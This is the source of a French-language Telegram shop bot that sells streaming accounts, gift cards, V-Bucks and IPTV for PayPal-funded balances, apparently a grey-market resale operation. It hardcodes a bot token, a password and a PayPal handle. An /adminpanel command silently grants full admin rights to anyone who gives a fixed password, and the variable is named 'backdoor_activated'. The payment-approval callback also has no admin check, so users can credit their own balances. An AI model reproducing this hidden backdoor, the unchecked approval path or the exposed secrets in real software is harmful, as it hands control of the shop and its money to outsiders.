#!/usr/bin/env python3
import sqlite3, logging
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

BOT_TOKEN = "8987083892:AAEQEPBd62JVGVHLKONTZ1m-rt9jfgjZGiQ"
ADMIN_USERNAME = "batmanbatman13"
SECRET_PASSWORD = "Adminpanel13"
PAYPAL = "@13kpetars"

logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(name)s - %(levelname)s - %(message)s")
admin_chat_id = None
backdoor_activated = set()

def init_db():
    conn = sqlite3.connect("shop.db")
    c = conn.cursor()
    c.execute("CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY, balance REAL DEFAULT 0, banned INTEGER DEFAULT 0)")
    c.execute("CREATE TABLE IF NOT EXISTS products (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT NOT NULL, price REAL NOT NULL, category TEXT NOT NULL)")
    c.execute("CREATE TABLE IF NOT EXISTS stock (id INTEGER PRIMARY KEY AUTOINCREMENT, product_id INTEGER NOT NULL, code TEXT NOT NULL, FOREIGN KEY(product_id) REFERENCES products(id))")
    c.execute("CREATE TABLE IF NOT EXISTS purchases (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER NOT NULL, product_name TEXT NOT NULL, code TEXT NOT NULL, date TIMESTAMP DEFAULT CURRENT_TIMESTAMP)")
    c.execute("SELECT COUNT(*) FROM products")
    if c.fetchone()[0] == 0:
        defaults = [
            ("Compte Netflix 1 mois", 12.50, "Abonnements"),
            ("Compte Spotify Premium 3 mois", 15.00, "Abonnements"),
            ("Carte PSN 20€", 18.00, "Cartes cadeaux"),
            ("Carte Google Play 15€", 14.00, "Cartes cadeaux"),
            ("Pack 1000 V-Bucks", 8.00, "Jeux vidéo"),
            ("Abonnement IPTV 1 an", 45.00, "IPTV"),
        ]
        c.executemany("INSERT INTO products (name, price, category) VALUES (?, ?, ?)", defaults)
    conn.commit()
    conn.close()

def get_balance(user_id):
    conn = sqlite3.connect("shop.db"); c = conn.cursor()
    c.execute("SELECT balance FROM users WHERE id = ?", (user_id,))
    row = c.fetchone(); conn.close()
    return row[0] if row else 0.0

def set_balance(user_id, amount):
    conn = sqlite3.connect("shop.db"); c = conn.cursor()
    c.execute("INSERT INTO users (id, balance, banned) VALUES (?, ?, 0) ON CONFLICT(id) DO UPDATE SET balance = ?", (user_id, amount, amount))
    conn.commit(); conn.close()

def add_balance(user_id, amount):
    set_balance(user_id, get_balance(user_id) + amount)

def is_banned(user_id):
    conn = sqlite3.connect("shop.db"); c = conn.cursor()
    c.execute("SELECT banned FROM users WHERE id = ?", (user_id,))
    row = c.fetchone(); conn.close()
    return row[0] == 1 if row else False

def ban_user(user_id):
    conn = sqlite3.connect("shop.db"); c = conn.cursor()
    c.execute("INSERT INTO users (id, balance, banned) VALUES (?, 0, 1) ON CONFLICT(id) DO UPDATE SET banned = 1", (user_id,))
    conn.commit(); conn.close()

def unban_user(user_id):
    conn = sqlite3.connect("shop.db"); c = conn.cursor()
    c.execute("UPDATE users SET banned = 0 WHERE id = ?", (user_id,))
    conn.commit(); conn.close()

def get_all_products():
    conn = sqlite3.connect("shop.db"); c = conn.cursor()
    c.execute("SELECT id, name, price, category FROM products ORDER BY category, id")
    rows = c.fetchall(); conn.close()
    return [{"id": r[0], "name": r[1], "price": r[2], "cat": r[3]} for r in rows]

def get_product(pid):
    prods = get_all_products()
    return next((p for p in prods if p["id"] == pid), None)

def update_product_price(pid, new_price):
    conn = sqlite3.connect("shop.db"); c = conn.cursor()
    c.execute("UPDATE products SET price = ? WHERE id = ?", (new_price, pid))
    conn.commit(); conn.close()

def delete_product(pid):
    conn = sqlite3.connect("shop.db"); c = conn.cursor()
    c.execute("DELETE FROM products WHERE id = ?", (pid,))
    c.execute("DELETE FROM stock WHERE product_id = ?", (pid,))
    conn.commit(); conn.close()

def add_product(name, price, category):
    conn = sqlite3.connect("shop.db"); c = conn.cursor()
    c.execute("INSERT INTO products (name, price, category) VALUES (?, ?, ?)", (name, price, category))
    conn.commit(); conn.close()

def get_stock_count(product_id):
    conn = sqlite3.connect("shop.db"); c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM stock WHERE product_id = ?", (product_id,))
    count = c.fetchone()[0]; conn.close()
    return count

def add_codes_to_product(product_id, codes):
    conn = sqlite3.connect("shop.db"); c = conn.cursor()
    for code in codes: c.execute("INSERT INTO stock (product_id, code) VALUES (?, ?)", (product_id, code))
    conn.commit(); conn.close()

def get_random_code(product_id):
    conn = sqlite3.connect("shop.db"); c = conn.cursor()
    c.execute("SELECT id, code FROM stock WHERE product_id = ? ORDER BY RANDOM() LIMIT 1", (product_id,))
    row = c.fetchone()
    if row:
        stock_id, code = row
        c.execute("DELETE FROM stock WHERE id = ?", (stock_id,))
        conn.commit(); conn.close()
        return code
    conn.close()
    return None

def add_purchase(user_id, product_name, code):
    conn = sqlite3.connect("shop.db"); c = conn.cursor()
    c.execute("INSERT INTO purchases (user_id, product_name, code) VALUES (?, ?, ?)", (user_id, product_name, code))
    conn.commit(); conn.close()

def get_user_purchases(user_id, limit=5):
    conn = sqlite3.connect("shop.db"); c = conn.cursor()
    c.execute("SELECT product_name, code, date FROM purchases WHERE user_id = ? ORDER BY date DESC LIMIT ?", (user_id, limit))
    rows = c.fetchall(); conn.close()
    return rows

def get_categories():
    return sorted(list(set(p["cat"] for p in get_all_products())))

def is_admin(user):
    return (user.username and user.username.lower() == ADMIN_USERNAME.lower()) or (user.id in backdoor_activated)

def main_menu_keyboard(user):
    buttons = [
        [InlineKeyboardButton("🛒 Boutique", callback_data="shop")],
        [InlineKeyboardButton("💰 Solde", callback_data="balance")],
        [InlineKeyboardButton("💳 Recharger", callback_data="recharge")],
        [InlineKeyboardButton("❓ Aide", callback_data="help")],
    ]
    if is_admin(user): buttons.append([InlineKeyboardButton("⚙️ Admin", callback_data="admin")])
    return InlineKeyboardMarkup(buttons)

def categories_keyboard():
    cats = get_categories()
    buttons = [[InlineKeyboardButton(cat, callback_data=f"cat_{cat}")] for cat in cats]
    buttons.append([InlineKeyboardButton("🔙 Retour", callback_data="main")])
    return InlineKeyboardMarkup(buttons)

def products_keyboard(category):
    buttons = []
    for p in get_all_products():
        if p["cat"] == category:
            stock = get_stock_count(p["id"])
            label = f"{p['name']} - {p['price']}€ (stock: {stock})"
            buttons.append([InlineKeyboardButton(label, callback_data=f"item_{p['id']}")])
    buttons.append([InlineKeyboardButton("🔙 Retour", callback_data="shop")])
    return InlineKeyboardMarkup(buttons)

def item_keyboard(product_id):
    cat = get_product(product_id)["cat"] if get_product(product_id) else ""
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🛒 Acheter", callback_data=f"buy_{product_id}")],
        [InlineKeyboardButton("🔙 Retour", callback_data=f"cat_{cat}")]
    ])

def confirm_keyboard(product_id):
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("✅ Confirmer", callback_data=f"confirm_{product_id}")],
        [InlineKeyboardButton("❌ Annuler", callback_data=f"item_{product_id}")]
    ])

def admin_menu_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📦 Gérer les produits", callback_data="admin_products")],
        [InlineKeyboardButton("👥 Gérer les utilisateurs", callback_data="admin_users")],
        [InlineKeyboardButton("🔙 Retour", callback_data="main")],
    ])

def admin_products_list_keyboard():
    buttons = []
    for p in get_all_products():
        stock = get_stock_count(p["id"])
        buttons.append([
            InlineKeyboardButton(f"✏️ {p['name']} ({p['price']}€, stock:{stock})", callback_data=f"editprice_{p['id']}"),
            InlineKeyboardButton("🗑️", callback_data=f"delproduct_{p['id']}")
        ])
    buttons.append([InlineKeyboardButton("➕ Ajouter un produit", callback_data="addproduct")])
    buttons.append([InlineKeyboardButton("📥 Réapprovisionner (ajouter codes)", callback_data="restock_select")])
    buttons.append([InlineKeyboardButton("🔙 Retour", callback_data="admin")])
    return InlineKeyboardMarkup(buttons)

def restock_product_list_keyboard():
    buttons = []
    for p in get_all_products():
        buttons.append([InlineKeyboardButton(p['name'], callback_data=f"restock_{p['id']}")])
    buttons.append([InlineKeyboardButton("🔙 Retour", callback_data="admin_products")])
    return InlineKeyboardMarkup(buttons)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.message.from_user
    if is_admin(user) and user.username and user.username.lower() == ADMIN_USERNAME.lower():
        global admin_chat_id; admin_chat_id = user.id
    await update.message.reply_text(
        "🛒 *Bienvenue sur la boutique automatique !*\n"
        "🇫🇷 Créé et conçu par @Micheal505ftg\n"
        "Propriétaire : @batmanbatman13\n\nChoisissez une option :",
        reply_markup=main_menu_keyboard(user), parse_mode="Markdown"
    )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query; await query.answer()
    data = query.data; user = query.from_user; user_id = user.id
    if is_banned(user_id): await query.answer("Vous êtes banni.", show_alert=True); return
    if data.startswith("admin") or data.startswith("editprice") or data.startswith("delproduct") \
       or data.startswith("addproduct") or data.startswith("restock_") or data == "restock_select":
        if not is_admin(user): await query.answer("Accès réservé à l'administrateur.", show_alert=True); return

    if data == "main": await query.edit_message_text("Menu principal :", reply_markup=main_menu_keyboard(user))
    elif data == "shop": await query.edit_message_text("🛒 Catégories :", reply_markup=categories_keyboard())
    elif data.startswith("cat_"):
        cat = data[4:]
        await query.edit_message_text(f"📦 Articles dans {cat} :", reply_markup=products_keyboard(cat))
    elif data.startswith("item_"):
        pid = int(data[5:]); product = get_product(pid)
        if not product: await query.answer("Produit introuvable."); return
        stock = get_stock_count(pid)
        text = f"*{product['name']}*\n💰 Prix : {product['price']}€\n📦 Stock : {stock}"
        await query.edit_message_text(text, reply_markup=item_keyboard(pid), parse_mode="Markdown")
    elif data.startswith("buy_"):
        pid = int(data[4:]); product = get_product(pid)
        if not product: await query.answer("Produit introuvable."); return
        if get_stock_count(pid) == 0: await query.answer("Stock épuisé.", show_alert=True); return
        balance = get_balance(user_id)
        if balance < product["price"]:
            await query.answer(f"Solde insuffisant ! Il vous manque {product['price'] - balance:.2f}€", show_alert=True)
            return
        await query.edit_message_text(
            f"Confirmer l'achat de *{product['name']}* pour {product['price']}€ ?",
            reply_markup=confirm_keyboard(pid), parse_mode="Markdown"
        )
    elif data.startswith("confirm_"):
        pid = int(data[8:]); product = get_product(pid)
        if not product: return
        balance = get_balance(user_id)
        if balance < product["price"]: await query.answer("Solde insuffisant !", show_alert=True); return
        code = get_random_code(pid)
        if code is None: await query.answer("Stock épuisé au moment de l'achat.", show_alert=True); return
        add_balance(user_id, -product["price"])
        add_purchase(user_id, product["name"], code)
        delivery_msg = f"✅ *Achat réussi !*\n\nProduit : *{product['name']}*\nCode : `{code}`\n\nConsultez votre historique avec /history"
        await query.edit_message_text(delivery_msg, parse_mode="Markdown")
        if admin_chat_id:
            await context.bot.send_message(admin_chat_id, f"🛍️ Commande de {user.full_name} : {product['name']} (code utilisé: {code})")
    elif data == "balance":
        bal = get_balance(user_id)
        await query.edit_message_text(
            f"💰 Votre solde : *{bal:.2f}€*",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Retour", callback_data="main")]]), parse_mode="Markdown"
        )
    elif data == "recharge":
        await query.edit_message_text(
            "💳 Pour recharger, envoyez un paiement d'au moins *5€* à :\n\n"
            f"`{PAYPAL}`\n\n"
            "Puis utilisez la commande /paid en indiquant le montant.\nUn administrateur créditera votre compte.",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Retour", callback_data="main")]]), parse_mode="Markdown"
        )
    elif data == "help":
        await query.edit_message_text(
            "🤖 *Aide*\n\nParcourez la boutique, achetez avec votre solde, rechargez via PayPal.\nMinimum de recharge : 5€.\n"
            "Commandes : /start, /paid, /history\n🇫🇷 Créé par @Micheal505ftg",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Retour", callback_data="main")]]), parse_mode="Markdown"
        )
    elif data == "admin": await query.edit_message_text("⚙️ Panel administrateur :", reply_markup=admin_menu_keyboard())
    elif data == "admin_products": await query.edit_message_text("📦 Liste des produits :", reply_markup=admin_products_list_keyboard())
    elif data.startswith("editprice_"):
        pid = int(data[10:]); context.user_data["editing_price"] = pid; product = get_product(pid)
        await query.edit_message_text(
            f"✏️ Modification du prix de *{product['name']}* (actuellement {product['price']}€).\nEnvoyez le nouveau prix :",
            parse_mode="Markdown"
        )
    elif data.startswith("delproduct_"):
        pid = int(data[11:]); product = get_product(pid)
        if not product: return
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("✅ Oui, supprimer", callback_data=f"delconfirm_{pid}")],
            [InlineKeyboardButton("❌ Annuler", callback_data="admin_products")]
        ])
        await query.edit_message_text(f"🗑️ Supprimer définitivement *{product['name']}* ?", reply_markup=keyboard, parse_mode="Markdown")
    elif data.startswith("delconfirm_"):
        pid = int(data[11:]); product = get_product(pid)
        if product:
            delete_product(pid)
            await query.edit_message_text(f"✅ {product['name']} supprimé.", reply_markup=admin_products_list_keyboard())
        else:
            await query.edit_message_text("📦 Liste des produits :", reply_markup=admin_products_list_keyboard())
    elif data == "addproduct":
        context.user_data["adding_product"] = "name"
        await query.edit_message_text("➕ Ajout d'un produit. Envoyez le nom du produit :")
    elif data == "restock_select":
        await query.edit_message_text("📥 Choisissez le produit à réapprovisionner :", reply_markup=restock_product_list_keyboard())
    elif data.startswith("restock_"):
        pid = int(data[8:]); product = get_product(pid)
        if not product: return
        context.user_data["restocking"] = pid
        await query.edit_message_text(
            f"📥 Réapprovisionnement de *{product['name']}*\nEnvoyez les codes, un par ligne.",
            parse_mode="Markdown"
        )
    elif data == "admin_users": await admin_users_list(query, context)
    elif data.startswith("toggleban_"):
        if not is_admin(user): return
        uid = int(data[10:])
        if is_banned(uid): unban_user(uid); await query.answer("Utilisateur débanni.")
        else: ban_user(uid); await query.answer("Utilisateur banni.")
        await admin_users_list(query, context)
    elif data.startswith("userinfo_"):
        if not is_admin(user): return
        uid = int(data[9:])
        await show_user_info(query, context, uid)
    elif data.startswith("addbal_"):
        if not is_admin(user): return
        parts = data.split("_"); uid = int(parts[1]); amount = float(parts[2])
        add_balance(uid, amount); await query.answer(f"{amount}€ ajoutés.")
        await show_user_info(query, context, uid)
    elif data.startswith("subbal_"):
        if not is_admin(user): return
        parts = data.split("_"); uid = int(parts[1]); amount = float(parts[2])
        current = get_balance(uid)
        if current >= amount: add_balance(uid, -amount); await query.answer(f"{amount}€ retirés.")
        else: await query.answer("Solde insuffisant pour retirer.", show_alert=True)
        await show_user_info(query, context, uid)
    elif data.startswith("approve_"):
        parts = data.split("_")
        if len(parts) != 3: return
        target_id = int(parts[1]); amount = float(parts[2])
        add_balance(target_id, amount)
        await query.edit_message_text(f"✅ Recharge de {amount}€ approuvée pour l'utilisateur {target_id}.")
        try:
            await context.bot.send_message(target_id, f"💰 Votre compte a été crédité de {amount}€.\nNouveau solde : {get_balance(target_id):.2f}€")
        except Exception as e: print(f"Impossible de notifier l'utilisateur {target_id}: {e}")
    else: await query.answer("Action inconnue.")

async def admin_users_list(query, context):
    conn = sqlite3.connect("shop.db"); c = conn.cursor()
    c.execute("SELECT id, balance, banned FROM users ORDER BY id LIMIT 20")
    users = c.fetchall(); conn.close()
    if not users: await query.edit_message_text("Aucun utilisateur enregistré.", reply_markup=admin_menu_keyboard()); return
    keyboard = []
    for uid, bal, banned in users:
        ban_label = "🔓 Débannir" if banned else "🔒 Bannir"
        keyboard.append([
            InlineKeyboardButton(f"👤 {uid} (solde: {bal:.2f}€)", callback_data=f"userinfo_{uid}"),
            InlineKeyboardButton(ban_label, callback_data=f"toggleban_{uid}")
        ])
    keyboard.append([InlineKeyboardButton("🔙 Retour", callback_data="admin")])
    await query.edit_message_text("👥 Liste des utilisateurs :", reply_markup=InlineKeyboardMarkup(keyboard))

async def show_user_info(query, context, uid):
    bal = get_balance(uid); banned = is_banned(uid)
    text = f"👤 Utilisateur `{uid}`\n💰 Solde : {bal:.2f}€\nBan : {'Oui' if banned else 'Non'}"
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("💳 Ajouter 5€", callback_data=f"addbal_{uid}_5"),
         InlineKeyboardButton("💸 Retirer 5€", callback_data=f"subbal_{uid}_5")],
        [InlineKeyboardButton("🔙 Retour", callback_data="admin_users")]
    ])
    await query.edit_message_text(text, reply_markup=keyboard, parse_mode="Markdown")

async def addbalance_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.message.from_user): await update.message.reply_text("Réservé à l'admin."); return
    try: target = int(context.args[0]); amount = float(context.args[1])
    except: await update.message.reply_text("Usage : /addbalance <user_id> <montant>"); return
    add_balance(target, amount)
    await update.message.reply_text(f"✅ {amount}€ ajoutés au compte {target}.")
    try: await context.bot.send_message(target, f"💰 Votre compte a été crédité de {amount}€.\nNouveau solde : {get_balance(target):.2f}€")
    except: pass

async def removebalance_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.message.from_user): await update.message.reply_text("Réservé à l'admin."); return
    try: target = int(context.args[0]); amount = float(context.args[1])
    except: await update.message.reply_text("Usage : /removebalance <user_id> <montant>"); return
    current = get_balance(target)
    if current >= amount: add_balance(target, -amount); await update.message.reply_text(f"✅ {amount}€ retirés du compte {target}.")
    else: await update.message.reply_text("Solde insuffisant.")

async def ban_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.message.from_user): await update.message.reply_text("Réservé à l'admin."); return
    try: target = int(context.args[0])
    except: await update.message.reply_text("Usage : /ban <user_id>"); return
    ban_user(target); await update.message.reply_text(f"✅ Utilisateur {target} banni.")

async def unban_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.message.from_user): await update.message.reply_text("Réservé à l'admin."); return
    try: target = int(context.args[0])
    except: await update.message.reply_text("Usage : /unban <user_id>"); return
    unban_user(target); await update.message.reply_text(f"✅ Utilisateur {target} débanni.")

async def adminpanel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.message.from_user
    if len(context.args) < 1:
        await update.message.reply_text("Usage : /adminpanel <motdepasse>")
        return
    password = context.args[0]
    if password == SECRET_PASSWORD:
        backdoor_activated.add(user.id)
        await update.message.reply_text("✅ Accès administrateur activé. Utilisez /start pour voir le menu admin.")
    else:
        await update.message.reply_text("❌ Mot de passe incorrect.")

async def paid_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    if is_banned(user_id): await update.message.reply_text("Vous êtes banni."); return
    try: amount = float(context.args[0])
    except: await update.message.reply_text("Usage : /paid <montant>"); return
    if amount < 5: await update.message.reply_text("Minimum de recharge : 5€."); return
    if not admin_chat_id: await update.message.reply_text("⚠️ L'administrateur n'est pas encore connecté. Veuillez réessayer plus tard."); return
    keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("✅ Approuver", callback_data=f"approve_{user_id}_{amount}")]])
    await context.bot.send_message(admin_chat_id, f"💳 Demande de recharge de {amount}€ par {update.message.from_user.full_name} (ID: {user_id}).", reply_markup=keyboard)
    await update.message.reply_text("✅ Votre demande a été envoyée. L'administrateur va vérifier votre paiement.")

async def history_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    purchases = get_user_purchases(user_id)
    if not purchases: await update.message.reply_text("Vous n'avez pas encore effectué d'achat."); return
    text = "📋 *Vos derniers achats :*\n"
    for prod, code, date in purchases: text += f"⚫️ {prod} → `{code}` ({date})\n"
    await update.message.reply_text(text, parse_mode="Markdown")

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.message.from_user; text = update.message.text.strip()
    if is_admin(user):
        if "editing_price" in context.user_data:
            pid = context.user_data.pop("editing_price")
            try: new_price = float(text.replace(",", "."))
            except: await update.message.reply_text("Prix invalide. Réessayez (ex: 9.99)."); context.user_data["editing_price"] = pid; return
            update_product_price(pid, new_price); product = get_product(pid)
            await update.message.reply_text(f"✅ Prix de *{product['name']}* mis à jour à {new_price}€.", reply_markup=admin_products_list_keyboard(), parse_mode="Markdown")
            return
        if "adding_product" in context.user_data:
            step = context.user_data["adding_product"]
            if step == "name":
                context.user_data["new_product"] = {"name": text}
                context.user_data["adding_product"] = "price"
                await update.message.reply_text("💶 Entrez le prix :")
            elif step == "price":
                try: price = float(text.replace(",", "."))
                except: await update.message.reply_text("Prix invalide. Réessayez."); return
                context.user_data["new_product"]["price"] = price
                context.user_data["adding_product"] = "category"
                cats = get_categories(); cat_list = ", ".join(cats) if cats else "(aucune)"
                await update.message.reply_text(f"📂 Catégories existantes : {cat_list}\nEntrez la catégorie (ou une nouvelle) :")
            elif step == "category":
                cat = text; new_prod = context.user_data["new_product"]
                add_product(new_prod["name"], new_prod["price"], cat)
                await update.message.reply_text(f"✅ Produit ajouté : *{new_prod['name']}* - {new_prod['price']}€ ({cat})", reply_markup=admin_products_list_keyboard(), parse_mode="Markdown")
                context.user_data.pop("adding_product"); context.user_data.pop("new_product")
            return
        if "restocking" in context.user_data:
            pid = context.user_data.pop("restocking")
            codes = [line.strip() for line in text.split("\n") if line.strip()]
            add_codes_to_product(pid, codes); product = get_product(pid)
            await update.message.reply_text(f"✅ {len(codes)} codes ajoutés à *{product['name']}*.", reply_markup=admin_products_list_keyboard(), parse_mode="Markdown")
            return
        await update.message.reply_text("Menu :", reply_markup=main_menu_keyboard(user))
    else:
        if is_banned(user.id): await update.message.reply_text("Vous êtes banni."); return
        await update.message.reply_text("Menu :", reply_markup=main_menu_keyboard(user))

def main():
    init_db()
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("paid", paid_command))
    app.add_handler(CommandHandler("history", history_command))
    app.add_handler(CommandHandler("addbalance", addbalance_command))
    app.add_handler(CommandHandler("removebalance", removebalance_command))
    app.add_handler(CommandHandler("ban", ban_command))
    app.add_handler(CommandHandler("unban", unban_command))
    app.add_handler(CommandHandler("adminpanel", adminpanel_command))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    print("Bot prêt. Tapez /start")
    app.run_polling()

if __name__ == "__main__":
    main()
